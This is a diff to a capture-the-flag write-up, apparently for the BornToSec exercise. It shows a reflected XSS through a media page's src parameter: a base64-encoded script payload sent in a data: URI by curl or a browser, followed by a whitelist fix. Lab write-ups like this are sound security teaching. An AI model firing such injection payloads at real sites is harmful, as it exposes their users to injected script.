@@ -6,17 +6,24 @@ The media page loads a file using the _src_ parameter. The app doesn't sanitize 
 ## ⚙️ Exploitation Process
 Encode the XSS payload and send it with the ```data:/text/html,base64;<base64 HTML code>``` wrapper. 
 
-- Encode the payload in base64:
+---
+
+**1. Encode the payload in base64**
 
 ```
 echo '<script> alert(42); </script>' | base64
 ```
 
-- Send the encoded payload with curl, trigger XSS and get the flag:
+---
+
+**2. Send the encoded payload**
 
 ```
-curl -s 'http://localhost:9090/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD4gYWxlcnQoNDIpOyA8L3NjcmlwdD4K' | grep flag
+curl -s 'http://BornToSec.com/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD4gYWxlcnQoNDIpOyA8L3NjcmlwdD4K' | grep flag
 ```
+
+> The payload can also be sent with a web browser: http://BornToSec.com/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD4gYWxlcnQoNDIpOyA8L3NjcmlwdD4K
+
 
 ## 🔧 Fix
 To prevent from injections, the most secure and easy to implement fix is using a whitelist for the loadable sources.
